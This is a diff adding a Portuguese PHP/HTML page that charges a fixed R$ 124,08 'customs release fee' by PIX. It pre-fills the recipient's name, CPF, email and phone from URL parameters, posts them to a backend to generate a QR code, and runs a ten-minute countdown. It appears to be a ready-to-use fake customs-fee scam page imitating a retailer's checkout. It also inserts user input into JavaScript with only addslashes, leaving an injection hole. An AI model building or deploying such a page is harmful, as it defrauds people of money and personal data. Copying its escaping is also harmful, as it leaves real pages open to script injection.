@@ -1,0 +1,511 @@
+<?php
+// Recebe os dados via GET ou POST
+$nome = $_GET['nome'] ?? $_POST['nome'] ?? 'Cliente';
+$cpf = $_GET['cpf'] ?? $_POST['cpf'] ?? '';
+$email = $_GET['email'] ?? $_POST['email'] ?? '';
+$telefone = $_GET['telefone'] ?? $_POST['telefone'] ?? '';
+$nascimento = $_GET['nascimento'] ?? $_POST['nascimento'] ?? '';
+$valor = 12408; // R$ 124,08 em centavos
+?>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento da taxa de liberação</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #e5e5e5;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            background: white;
+            max-width: 480px;
+            width: 100%;
+            height: 100vh;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            background: white;
+            border-top: 4px solid #FFD600;
+            padding: 16px 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+            flex-shrink: 0;
+        }
+        .header h1 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+            margin: 0;
+        }
+        .content {
+            flex: 1;
+            padding: 20px;
+            background: #f5f5f5;
+            overflow-y: auto;
+        }
+        .info-box {
+            background: white;
+            padding: 16px 20px;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+        .info-label {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 6px;
+            font-weight: 400;
+        }
+        .info-value {
+            font-size: 17px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        .description {
+            font-size: 14px;
+            color: #666;
+            font-weight: 400;
+        }
+        .footer {
+            background: white;
+            padding: 16px 20px;
+            border-top: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+            box-shadow: 0 -2px 8px rgba(0,0,0,0.05);
+        }
+        .total-section {
+            display: flex;
+            flex-direction: column;
+        }
+        .total-label {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 2px;
+        }
+        .total-value {
+            font-size: 32px;
+            font-weight: 700;
+            color: #3483FA;
+            line-height: 1;
+        }
+        .btn-pagar {
+            background: #3483FA;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            white-space: nowrap;
+        }
+        .btn-pagar:hover {
+            background: #2968c8;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+            }
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            animation: fadeIn 0.3s;
+            justify-content: center;
+            align-items: center;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .modal-content {
+            position: relative;
+            background-color: white;
+            padding: 0;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 8px;
+            animation: slideDown 0.3s;
+            margin: auto;
+        }
+        @keyframes slideDown {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .modal-header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .modal-header h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .timer {
+            font-size: 14px;
+            color: #666;
+        }
+        .modal-body {
+            padding: 30px;
+            text-align: center;
+        }
+        .qr-code {
+            width: 250px;
+            height: 250px;
+            margin: 0 auto 20px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+        }
+        .qr-code canvas {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        .pix-code-container {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .pix-code {
+            flex: 1;
+            font-family: monospace;
+            font-size: 11px;
+            color: #333;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .btn-copiar {
+            background: #3483FA;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .btn-copiar:hover {
+            background: #2968c8;
+        }
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #999;
+            cursor: pointer;
+            line-height: 20px;
+        }
+        .close:hover {
+            color: #333;
+        }
+        .loading-qr {
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Pagamento da taxa de liberação</h1>
+        </div>
+        
+        <div class="content">
+            <div class="info-box">
+                <div class="info-label">Destinatário</div>
+                <div class="info-value"><?php echo strtoupper(htmlspecialchars($nome)); ?></div>
+                <div class="description">Taxa alfandegária — importação</div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="total-section">
+                <div class="total-label">Total</div>
+                <div class="total-value">R$ 124,08</div>
+            </div>
+            <button class="btn-pagar" onclick="abrirModal()">Pagar com PIX</button>
+        </div>
+    </div>
+
+    <!-- Modal PIX -->
+    <div id="pixModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="fecharModal()">&times;</span>
+            <div class="modal-header">
+                <h2>PIX</h2>
+                <div class="timer">Expira em <span id="timer">10:00</span></div>
+            </div>
+            <div class="modal-body">
+                <div class="qr-code" id="qrcode">
+                    <div class="loading-qr">Gerando QR Code...</div>
+                </div>
+                <div class="pix-code-container">
+                    <div class="pix-code" id="pixCode">Carregando código PIX...</div>
+                    <button class="btn-copiar" onclick="copiarCodigo()">Copiar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script>
+        let timerInterval = null;
+        let timeLeft = 600; // 10 minutos em segundos
+
+        function abrirModal() {
+            const modal = document.getElementById('pixModal');
+            modal.style.display = 'flex'; // Mudado para flex para centralizar
+            
+            // Faz requisição para gerar o PIX
+            gerarPIX();
+            
+            // Inicia o timer
+            iniciarTimer();
+        }
+
+        function fecharModal() {
+            const modal = document.getElementById('pixModal');
+            modal.style.display = 'none';
+            
+            // Para o timer
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+        }
+
+        function gerarPIX() {
+            // Verifica se QRCode está disponível
+            if (typeof QRCode === 'undefined') {
+                console.error('QRCode library not loaded');
+                alert('Erro: Biblioteca de QR Code não carregada. Recarregue a página.');
+                fecharModal();
+                return;
+            }
+
+            // Dados do formulário
+            const formData = new FormData();
+            formData.append('cpf', '<?php echo addslashes(preg_replace("/[^0-9]/", "", $cpf)); ?>');
+            formData.append('nome', '<?php echo addslashes($nome); ?>');
+            formData.append('email', '<?php echo addslashes($email); ?>');
+            formData.append('telefone', '<?php echo addslashes($telefone); ?>');
+
+            console.log('Enviando dados:', {
+                cpf: '<?php echo addslashes(preg_replace("/[^0-9]/", "", $cpf)); ?>',
+                nome: '<?php echo addslashes($nome); ?>',
+                email: '<?php echo addslashes($email); ?>',
+                telefone: '<?php echo addslashes($telefone); ?>'
+            });
+
+            // Faz a requisição para criar a transação
+            fetch('processar_pagamento.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                console.log('Response status:', response.status);
+                return response.json();
+            })
+            .then(data => {
+                console.log('Response data:', data);
+                
+                if (data.success && data.qr_code) {
+                    // Gera o QR Code
+                    const qrcodeContainer = document.getElementById('qrcode');
+                    qrcodeContainer.innerHTML = '';
+                    
+                    try {
+                        // Tenta usar a API do QRCode.js que retorna canvas
+                        if (typeof QRCode.toCanvas === 'function') {
+                            QRCode.toCanvas(data.qr_code, { 
+                                width: 230, 
+                                margin: 1,
+                                color: {
+                                    dark: '#000000',
+                                    light: '#FFFFFF'
+                                }
+                            }, function(error, canvas) {
+                                if (error) {
+                                    console.error('Erro QR Code:', error);
+                                    qrcodeContainer.innerHTML = '<div class="loading-qr">Erro ao gerar QR Code</div>';
+                                } else {
+                                    qrcodeContainer.appendChild(canvas);
+                                }
+                            });
+                        } else {
+                            // Fallback: usa QRCode como construtor
+                            const qr = new QRCode(qrcodeContainer, {
+                                text: data.qr_code,
+                                width: 230,
+                                height: 230,
+                                colorDark: '#000000',
+                                colorLight: '#ffffff',
+                                correctLevel: QRCode.CorrectLevel.M
+                            });
+                        }
+                    } catch (error) {
+                        console.error('Erro ao gerar QR Code:', error);
+                        qrcodeContainer.innerHTML = '<div class="loading-qr">QR Code: ' + data.qr_code.substring(0, 20) + '...</div>';
+                    }
+                    
+                    // Mostra o código PIX
+                    document.getElementById('pixCode').textContent = data.qr_code;
+                    
+                    // Inicia verificação automática
+                    if (data.transaction_id) {
+                        iniciarVerificacao(data.transaction_id);
+                    }
+                } else {
+                    console.error('Erro na resposta:', data);
+                    alert('Erro ao gerar PIX: ' + (data.error || 'Dados inválidos na resposta'));
+                    fecharModal();
+                }
+            })
+            .catch(error => {
+                console.error('Erro na requisição:', error);
+                alert('Erro ao gerar PIX: ' + error.message);
+                fecharModal();
+            });
+        }
+
+        function copiarCodigo() {
+            const pixCode = document.getElementById('pixCode').textContent;
+            
+            // Cria elemento temporário para copiar
+            const tempInput = document.createElement('textarea');
+            tempInput.value = pixCode;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+            
+            // Feedback visual
+            const btn = event.target;
+            const textoOriginal = btn.textContent;
+            btn.textContent = 'Copiado!';
+            btn.style.background = '#00a650';
+            
+            setTimeout(() => {
+                btn.textContent = textoOriginal;
+                btn.style.background = '#3483FA';
+            }, 2000);
+        }
+
+        function iniciarTimer() {
+            const timerElement = document.getElementById('timer');
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    alert('Tempo expirado! Por favor, gere um novo código PIX.');
+                    fecharModal();
+                }
+            }, 1000);
+        }
+
+        function iniciarVerificacao(transactionId) {
+            // Verifica o status a cada 5 segundos
+            const verificarInterval = setInterval(() => {
+                fetch(`verificar_pagamento.php?transaction_id=${transactionId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success && data.status === 'PAID') {
+                            clearInterval(verificarInterval);
+                            clearInterval(timerInterval);
+                            fecharModal();
+                            alert('Pagamento confirmado!');
+                            window.location.href = 'pagamento_sucesso.php';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Erro ao verificar pagamento:', error);
+                    });
+            }, 5000);
+        }
+
+        // Fecha o modal ao clicar fora dele
+        window.onclick = function(event) {
+            const modal = document.getElementById('pixModal');
+            if (event.target == modal) {
+                fecharModal();
+            }
+        }
+
+        // Verifica se as bibliotecas carregaram
+        window.addEventListener('load', function() {
+            console.log('Página carregada');
+            console.log('QRCode disponível:', typeof QRCode !== 'undefined');
+            
+            if (typeof QRCode === 'undefined') {
+                console.error('ERRO: Biblioteca QRCode não carregou!');
+                console.log('Tentando carregar novamente...');
+                
+                // Tenta carregar novamente
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js';
+                script.onload = function() {
+                    console.log('QRCode carregado via fallback');
+                };
+                script.onerror = function() {
+                    console.error('Falha ao carregar QRCode via fallback');
+                };
+                document.head.appendChild(script);
+            }
+        });
+    </script>
+</body>
+</html>
